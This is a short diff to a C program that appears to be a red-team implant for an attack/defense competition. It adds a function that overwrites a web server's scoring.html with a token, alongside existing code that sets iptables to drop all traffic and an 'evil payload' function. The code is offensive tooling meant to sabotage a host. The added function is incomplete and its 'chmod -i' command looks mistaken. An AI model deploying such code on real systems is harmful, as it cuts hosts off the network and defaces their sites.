@@ -52,6 +52,27 @@ void dropAllFirewall(){
     system("iptables -t raw -P PREROUTING DROP");
 }
 
+void deployToken(){
+    char* token = "TOKENHERE";
+    char* prefix = "";
+    char* suffix = "";
+    char cmd[500] = "";
+    int method = 0;
+
+    if (method) {
+        system("chmod -i /var/www/html/scoring.html");
+        FILE *fptr;
+        fptr = fopen("/var/www/html/scoring.html", "w");
+        fprintf(fptr, "%s", token);
+    } else {
+        
+    }
+    
+
+
+
+}
+
 
 int payload(){
     //printf("Evil payload executed >:)\n");
